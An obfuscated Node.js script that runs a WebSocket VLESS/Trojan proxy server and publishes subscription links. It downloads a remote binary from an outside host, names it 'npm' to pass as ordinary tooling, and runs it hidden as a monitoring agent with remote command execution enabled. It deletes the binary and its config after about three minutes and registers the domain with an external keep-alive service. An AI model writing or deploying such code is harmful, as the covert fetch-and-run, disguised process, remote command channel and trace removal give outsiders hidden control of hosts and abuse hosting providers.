const _0x31e1d4=_0x4577;function _0x4577(_0x4b159d,_0x725870){const _0x32dae6=_0x32da();return _0x4577=function(_0x45778f,_0x451707){_0x45778f=_0x45778f-0xcf;let _0x3973ab=_0x32dae6[_0x45778f];return _0x3973ab;},_0x4577(_0x4b159d,_0x725870);}(function(_0x390b18,_0x2e3220){const _0x43009c=_0x4577,_0x29ec24=_0x390b18();while(!![]){try{const _0x5e528f=parseInt(_0x43009c(0x12b))/0x1*(parseInt(_0x43009c(0x130))/0x2)+parseInt(_0x43009c(0x133))/0x3*(parseInt(_0x43009c(0x149))/0x4)+parseInt(_0x43009c(0x127))/0x5*(parseInt(_0x43009c(0x137))/0x6)+parseInt(_0x43009c(0x113))/0x7*(parseInt(_0x43009c(0x14e))/0x8)+-parseInt(_0x43009c(0x124))/0x9+parseInt(_0x43009c(0xfd))/0xa*(parseInt(_0x43009c(0x11b))/0xb)+-parseInt(_0x43009c(0xdd))/0xc;if(_0x5e528f===_0x2e3220)break;else _0x29ec24['push'](_0x29ec24['shift']());}catch(_0x22f3d6){_0x29ec24['push'](_0x29ec24['shift']());}}}(_0x32da,0xb5246));const os=require('os'),http=require(_0x31e1d4(0xf1)),fs=require('fs'),axios=require(_0x31e1d4(0xe9)),net=require(_0x31e1d4(0xde)),path=require(_0x31e1d4(0x131)),crypto=require(_0x31e1d4(0x118)),{Buffer}=require(_0x31e1d4(0xf2)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x31e1d4(0xd0)][_0x31e1d4(0x102)]||_0x31e1d4(0x103),NEZHA_SERVER=process[_0x31e1d4(0xd0)][_0x31e1d4(0x136)]||'',NEZHA_PORT=process[_0x31e1d4(0xd0)][_0x31e1d4(0xee)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x31e1d4(0xd0)]['DOMAIN']||_0x31e1d4(0x13c),AUTO_ACCESS=process[_0x31e1d4(0xd0)]['AUTO_ACCESS']||!![],WSPATH=process[_0x31e1d4(0xd0)][_0x31e1d4(0xe5)]||UUID[_0x31e1d4(0x13b)](0x0,0x8),SUB_PATH=process[_0x31e1d4(0xd0)][_0x31e1d4(0x13f)]||_0x31e1d4(0x14f),NAME=process[_0x31e1d4(0xd0)][_0x31e1d4(0x117)]||_0x31e1d4(0xef),PORT=process[_0x31e1d4(0xd0)][_0x31e1d4(0xec)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5b242e=_0x31e1d4;try{const _0x324d75=await axios[_0x5b242e(0x106)](_0x5b242e(0xd4)),_0x2a99e2=_0x324d75[_0x5b242e(0x111)];ISP=(_0x2a99e2[_0x5b242e(0xe4)]+'-'+_0x2a99e2['asOrganization'])[_0x5b242e(0x138)](/ /g,'_');}catch(_0x3006a0){ISP=_0x5b242e(0xf5);}};GetISP();const httpServer=http[_0x31e1d4(0xf3)]((_0x340ce7,_0x31b077)=>{const _0x5c5f22=_0x31e1d4;if(_0x340ce7[_0x5c5f22(0x148)]==='/'){const _0x318232=path['join'](__dirname,_0x5c5f22(0xe3));fs[_0x5c5f22(0x14c)](_0x318232,'utf8',(_0x3a1e6e,_0x1ecbd3)=>{const _0xde78e6=_0x5c5f22;if(_0x3a1e6e){_0x31b077[_0xde78e6(0xf7)](0xc8,{'Content-Type':'text/html'}),_0x31b077[_0xde78e6(0xf4)](_0xde78e6(0xfb));return;}_0x31b077[_0xde78e6(0xf7)](0xc8,{'Content-Type':'text/html'}),_0x31b077['end'](_0x1ecbd3);});return;}else{if(_0x340ce7[_0x5c5f22(0x148)]==='/'+SUB_PATH){const _0x196001=_0x5c5f22(0x10a)+UUID+'@'+DOMAIN+_0x5c5f22(0xe1)+DOMAIN+_0x5c5f22(0x139)+DOMAIN+_0x5c5f22(0xfa)+WSPATH+'#'+NAME+'-'+ISP,_0x4c8de7=_0x5c5f22(0x10b)+UUID+'@'+DOMAIN+_0x5c5f22(0x144)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x39b9f2=_0x196001+'\x0a'+_0x4c8de7,_0x437a92=Buffer[_0x5c5f22(0x135)](_0x39b9f2)['toString'](_0x5c5f22(0x146));_0x31b077['writeHead'](0xc8,{'Content-Type':_0x5c5f22(0xd2)}),_0x31b077[_0x5c5f22(0xf4)](_0x437a92+'\x0a');}else _0x31b077[_0x5c5f22(0xf7)](0x194,{'Content-Type':_0x5c5f22(0xd2)}),_0x31b077['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x31e1d4(0x14a))]({'server':httpServer}),uuid=UUID[_0x31e1d4(0x138)](/-/g,''),DNS_SERVERS=[_0x31e1d4(0x145),_0x31e1d4(0x121)];function resolveHost(_0x1c6679){return new Promise((_0x4a7526,_0x2a0b48)=>{const _0x3b3344=_0x4577;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3b3344(0x126)](_0x1c6679)){_0x4a7526(_0x1c6679);return;}let _0x33b901=0x0;function _0x299d6b(){const _0x9ec281=_0x3b3344;if(_0x33b901>=DNS_SERVERS['length']){_0x2a0b48(new Error('Failed\x20to\x20resolve\x20'+_0x1c6679+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1c477d=DNS_SERVERS[_0x33b901];_0x33b901++;const _0x4f3ee6=_0x9ec281(0x141)+encodeURIComponent(_0x1c6679)+_0x9ec281(0xe0);axios[_0x9ec281(0x106)](_0x4f3ee6,{'timeout':0x1388,'headers':{'Accept':_0x9ec281(0x107)}})['then'](_0x383932=>{const _0x93177e=_0x9ec281,_0x2a239b=_0x383932[_0x93177e(0x111)];if(_0x2a239b[_0x93177e(0xdb)]===0x0&&_0x2a239b['Answer']&&_0x2a239b['Answer'][_0x93177e(0x12a)]>0x0){const _0x52cdde=_0x2a239b[_0x93177e(0xe2)]['find'](_0x8b4d5d=>_0x8b4d5d['type']===0x1);if(_0x52cdde){_0x4a7526(_0x52cdde[_0x93177e(0x111)]);return;}}_0x299d6b();})[_0x9ec281(0x12d)](_0x45b667=>{_0x299d6b();});}_0x299d6b();});}function handleVlessConnection(_0xc138ac,_0x4f65c9){const _0x3fcddf=_0x31e1d4,[_0x5d605d]=_0x4f65c9,_0x70636f=_0x4f65c9[_0x3fcddf(0x13b)](0x1,0x11);if(!_0x70636f[_0x3fcddf(0xdf)]((_0x14b56,_0x381258)=>_0x14b56==parseInt(uuid[_0x3fcddf(0x128)](_0x381258*0x2,0x2),0x10)))return![];let _0xaa9ba4=_0x4f65c9[_0x3fcddf(0x13b)](0x11,0x12)[_0x3fcddf(0x12c)]()+0x13;const _0x2a918f=_0x4f65c9[_0x3fcddf(0x13b)](_0xaa9ba4,_0xaa9ba4+=0x2)[_0x3fcddf(0x11c)](0x0),_0x57e235=_0x4f65c9[_0x3fcddf(0x13b)](_0xaa9ba4,_0xaa9ba4+=0x1)[_0x3fcddf(0x12c)](),_0x445fc3=_0x57e235==0x1?_0x4f65c9[_0x3fcddf(0x13b)](_0xaa9ba4,_0xaa9ba4+=0x4)[_0x3fcddf(0x105)]('.'):_0x57e235==0x2?new TextDecoder()[_0x3fcddf(0xcf)](_0x4f65c9[_0x3fcddf(0x13b)](_0xaa9ba4+0x1,_0xaa9ba4+=0x1+_0x4f65c9['slice'](_0xaa9ba4,_0xaa9ba4+0x1)[_0x3fcddf(0x12c)]())):_0x57e235==0x3?_0x4f65c9[_0x3fcddf(0x13b)](_0xaa9ba4,_0xaa9ba4+=0x10)[_0x3fcddf(0xdc)]((_0x4e95ee,_0x3e510c,_0xe7dfaf,_0x33c583)=>_0xe7dfaf%0x2?_0x4e95ee[_0x3fcddf(0xd9)](_0x33c583['slice'](_0xe7dfaf-0x1,_0xe7dfaf+0x1)):_0x4e95ee,[])['map'](_0x4c12a2=>_0x4c12a2[_0x3fcddf(0x11c)](0x0)[_0x3fcddf(0x142)](0x10))[_0x3fcddf(0x105)](':'):'';_0xc138ac[_0x3fcddf(0xf6)](new Uint8Array([_0x5d605d,0x0]));const _0x4226b7=createWebSocketStream(_0xc138ac);return resolveHost(_0x445fc3)[_0x3fcddf(0x10f)](_0x4f8323=>{const _0x387f3f=_0x3fcddf;net[_0x387f3f(0x125)]({'host':_0x4f8323,'port':_0x2a918f},function(){const _0x1f1f56=_0x387f3f;this[_0x1f1f56(0x109)](_0x4f65c9[_0x1f1f56(0x13b)](_0xaa9ba4)),_0x4226b7['on']('error',()=>{})[_0x1f1f56(0x104)](this)['on'](_0x1f1f56(0xed),()=>{})['pipe'](_0x4226b7);})['on']('error',()=>{});})[_0x3fcddf(0x12d)](_0x252958=>{const _0x44ff93=_0x3fcddf;net[_0x44ff93(0x125)]({'host':_0x445fc3,'port':_0x2a918f},function(){const _0x1608cd=_0x44ff93;this['write'](_0x4f65c9[_0x1608cd(0x13b)](_0xaa9ba4)),_0x4226b7['on'](_0x1608cd(0xed),()=>{})['pipe'](this)['on'](_0x1608cd(0xed),()=>{})[_0x1608cd(0x104)](_0x4226b7);})['on'](_0x44ff93(0xed),()=>{});}),!![];}function handleTrojanConnection(_0x27f00a,_0x4f62eb){const _0x380e8a=_0x31e1d4;try{if(_0x4f62eb[_0x380e8a(0x12a)]<0x3a)return![];const _0x4fa3ba=_0x4f62eb[_0x380e8a(0x13b)](0x0,0x38)['toString'](),_0xe8ef37=[UUID];let _0x19eef9=null;for(const _0x3f31f7 of _0xe8ef37){const _0x444534=crypto['createHash'](_0x380e8a(0xf0))[_0x380e8a(0xd5)](_0x3f31f7)['digest'](_0x380e8a(0x114));if(_0x444534===_0x4fa3ba){_0x19eef9=_0x3f31f7;break;}}if(!_0x19eef9)return![];let _0x52c678=0x38;_0x4f62eb[_0x52c678]===0xd&&_0x4f62eb[_0x52c678+0x1]===0xa&&(_0x52c678+=0x2);const _0x3088e9=_0x4f62eb[_0x52c678];if(_0x3088e9!==0x1)return![];_0x52c678+=0x1;const _0x4c0d77=_0x4f62eb[_0x52c678];_0x52c678+=0x1;let _0x58afe5,_0x3808bd;if(_0x4c0d77===0x1)_0x58afe5=_0x4f62eb[_0x380e8a(0x13b)](_0x52c678,_0x52c678+0x4)[_0x380e8a(0x105)]('.'),_0x52c678+=0x4;else{if(_0x4c0d77===0x3){const _0x244886=_0x4f62eb[_0x52c678];_0x52c678+=0x1,_0x58afe5=_0x4f62eb[_0x380e8a(0x13b)](_0x52c678,_0x52c678+_0x244886)['toString'](),_0x52c678+=_0x244886;}else{if(_0x4c0d77===0x4)_0x58afe5=_0x4f62eb['slice'](_0x52c678,_0x52c678+0x10)['reduce']((_0x53deb4,_0x4ad8b4,_0x3ac7c9,_0xf432ad)=>_0x3ac7c9%0x2?_0x53deb4[_0x380e8a(0xd9)](_0xf432ad['slice'](_0x3ac7c9-0x1,_0x3ac7c9+0x1)):_0x53deb4,[])['map'](_0x166a56=>_0x166a56[_0x380e8a(0x11c)](0x0)[_0x380e8a(0x142)](0x10))['join'](':'),_0x52c678+=0x10;else return![];}}_0x3808bd=_0x4f62eb[_0x380e8a(0x11c)](_0x52c678),_0x52c678+=0x2;_0x52c678<_0x4f62eb[_0x380e8a(0x12a)]&&_0x4f62eb[_0x52c678]===0xd&&_0x4f62eb[_0x52c678+0x1]===0xa&&(_0x52c678+=0x2);const _0x955ee4=createWebSocketStream(_0x27f00a);return resolveHost(_0x58afe5)['then'](_0x52b362=>{const _0x6a6340=_0x380e8a;net[_0x6a6340(0x125)]({'host':_0x52b362,'port':_0x3808bd},function(){const _0x11c1e7=_0x6a6340;_0x52c678<_0x4f62eb[_0x11c1e7(0x12a)]&&this[_0x11c1e7(0x109)](_0x4f62eb[_0x11c1e7(0x13b)](_0x52c678)),_0x955ee4['on'](_0x11c1e7(0xed),()=>{})['pipe'](this)['on'](_0x11c1e7(0xed),()=>{})['pipe'](_0x955ee4);})['on']('error',()=>{});})['catch'](_0x1e0510=>{const _0x56c493=_0x380e8a;net['connect']({'host':_0x58afe5,'port':_0x3808bd},function(){const _0x34fc21=_0x4577;_0x52c678<_0x4f62eb[_0x34fc21(0x12a)]&&this[_0x34fc21(0x109)](_0x4f62eb[_0x34fc21(0x13b)](_0x52c678)),_0x955ee4['on'](_0x34fc21(0xed),()=>{})['pipe'](this)['on'](_0x34fc21(0xed),()=>{})[_0x34fc21(0x104)](_0x955ee4);})['on'](_0x56c493(0xed),()=>{});}),!![];}catch(_0x1f251f){return![];}}wss['on'](_0x31e1d4(0x112),(_0x37e3e8,_0x1639ac)=>{const _0x2b6311=_0x31e1d4,_0x2ae8c1=_0x1639ac['url']||'';_0x37e3e8[_0x2b6311(0x10c)]('message',_0xf94142=>{const _0x26e171=_0x2b6311;if(_0xf94142['length']>0x11&&_0xf94142[0x0]===0x0){const _0x584f42=_0xf94142['slice'](0x1,0x11),_0x2d3c49=_0x584f42['every']((_0x22b979,_0x43f9e2)=>_0x22b979==parseInt(uuid[_0x26e171(0x128)](_0x43f9e2*0x2,0x2),0x10));if(_0x2d3c49){!handleVlessConnection(_0x37e3e8,_0xf94142)&&_0x37e3e8['close']();return;}}!handleTrojanConnection(_0x37e3e8,_0xf94142)&&_0x37e3e8[_0x26e171(0x11f)]();})['on']('error',()=>{});});function _0x32da(){const _0x494e7e=['every','&type=A',':443?encryption=none&security=tls&sni=','Answer','index.html','country','WSPATH','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','stream','axios','npm\x20is\x20running','post','PORT','error','NEZHA_PORT','Hug','sha224','http','buffer','createServer','end','Unknown','send','writeHead','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2096','&path=%2F','Hello\x20world!','\x20-p\x20','38550wuAPrH','npm\x20download\x20successfully','utf-8','arm64','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','UUID','5dc15e15-f285-4a9d-959b-0e4fbdd77b63','pipe','join','get','application/dns-json','includes','write','vless://','trojan://','once','application/json','client_secret:\x20','then','8443','data','connection','195426KeTmGt','hex','npm\x20is\x20already\x20running,\x20skip\x20running...','chmod\x20+x\x20npm','NAME','crypto','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2087','3949XqFcGy','readUInt16BE','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','443','close','Server\x20is\x20running\x20on\x20port\x20','1.1.1.1','arm','arch','12671082dPfJHP','connect','test','737005klGepY','substr','split','length','1prMAUx','readUInt8','catch','false','true','2529874AQwYjC','path','--tls','10194TCfWSX','setsid\x20nohup\x20./npm\x20-s\x20','from','NEZHA_SERVER','36ojyBGX','replace','&fp=chrome&type=ws&host=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','slice','1234.abc.com','unlink','npm','SUB_PATH','log','https://dns.google/resolve?name=','toString','config.yaml',':443?security=tls&sni=','8.8.4.4','base64','pop','url','596EMiRLz','Server','trim','readFile','Automatic\x20Access\x20Task\x20added\x20successfully','392bWfzMR','sub','decode','env','aarch64','text/plain','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://speed.cloudflare.com/meta','update','/bin/bash','error:\x20','finish','concat','https://arm64.ssss.nyc.mn/agent','Status','reduce','39092592UpjbNB','net'];_0x32da=function(){return _0x494e7e;};return _0x32da();}const getDownloadUrl=()=>{const _0x18bc57=_0x31e1d4,_0x13eaad=os[_0x18bc57(0x123)]();return _0x13eaad===_0x18bc57(0x122)||_0x13eaad===_0x18bc57(0x100)||_0x13eaad===_0x18bc57(0xd1)?!NEZHA_PORT?_0x18bc57(0xe6):_0x18bc57(0xda):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x18bc57(0xe7);},downloadFile=async()=>{const _0x5cfc9a=_0x31e1d4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x36d786=getDownloadUrl(),_0x33c8d1=await axios({'method':_0x5cfc9a(0x106),'url':_0x36d786,'responseType':_0x5cfc9a(0xe8)}),_0x1dc013=fs['createWriteStream'](_0x5cfc9a(0x13e));return _0x33c8d1['data'][_0x5cfc9a(0x104)](_0x1dc013),new Promise((_0x263731,_0x2ca4ad)=>{const _0x54bff9=_0x5cfc9a;_0x1dc013['on'](_0x54bff9(0xd8),()=>{const _0x301ab0=_0x54bff9;console[_0x301ab0(0x140)](_0x301ab0(0xfe)),exec(_0x301ab0(0x116),_0x232837=>{if(_0x232837)_0x2ca4ad(_0x232837);_0x263731();});}),_0x1dc013['on'](_0x54bff9(0xed),_0x2ca4ad);});}catch(_0x41d8c5){throw _0x41d8c5;}},runnz=async()=>{const _0x3100f1=_0x31e1d4;try{const _0x2ad544=execSync(_0x3100f1(0x13a),{'encoding':_0x3100f1(0xff)});if(_0x2ad544[_0x3100f1(0x14b)]()!==''){console['log'](_0x3100f1(0x115));return;}}catch(_0x463820){}await downloadFile();let _0x153902='',_0x53894b=[_0x3100f1(0x11e),_0x3100f1(0x110),_0x3100f1(0xf9),_0x3100f1(0x11a),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1bbfdb=_0x53894b[_0x3100f1(0x108)](NEZHA_PORT)?_0x3100f1(0x132):'';_0x153902=_0x3100f1(0x134)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3100f1(0xfc)+NEZHA_KEY+'\x20'+_0x1bbfdb+_0x3100f1(0xd3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x20d93d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3100f1(0x129)](':')[_0x3100f1(0x147)]():'',_0x595c36=_0x53894b[_0x3100f1(0x108)](_0x20d93d)?_0x3100f1(0x12f):_0x3100f1(0x12e),_0x1426e2=_0x3100f1(0x10e)+NEZHA_KEY+_0x3100f1(0x11d)+NEZHA_SERVER+_0x3100f1(0x119)+_0x595c36+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x1426e2);}_0x153902=_0x3100f1(0xf8);}else{console[_0x3100f1(0x140)](_0x3100f1(0x101));return;}}try{exec(_0x153902,{'shell':_0x3100f1(0xd6)},_0x1b4ec2=>{const _0x34e1a8=_0x3100f1;if(_0x1b4ec2)console[_0x34e1a8(0xed)]('npm\x20running\x20error:',_0x1b4ec2);else console[_0x34e1a8(0x140)](_0x34e1a8(0xea));});}catch(_0x57c8c9){console[_0x3100f1(0xed)](_0x3100f1(0xd7)+_0x57c8c9);}};async function addAccessTask(){const _0x42a12e=_0x31e1d4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5d0583='https://'+DOMAIN;try{const _0x3a43db=await axios[_0x42a12e(0xeb)]('https://oooo.serv00.net/add-url',{'url':_0x5d0583},{'headers':{'Content-Type':_0x42a12e(0x10d)}});console[_0x42a12e(0x140)](_0x42a12e(0x14d));}catch(_0x18689c){}}const delFiles=()=>{const _0x7f8c52=_0x31e1d4;fs[_0x7f8c52(0x13d)]('npm',()=>{}),fs[_0x7f8c52(0x13d)](_0x7f8c52(0x143),()=>{});};httpServer['listen'](PORT,()=>{const _0x461718=_0x31e1d4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x461718(0x140)](_0x461718(0x120)+PORT);});
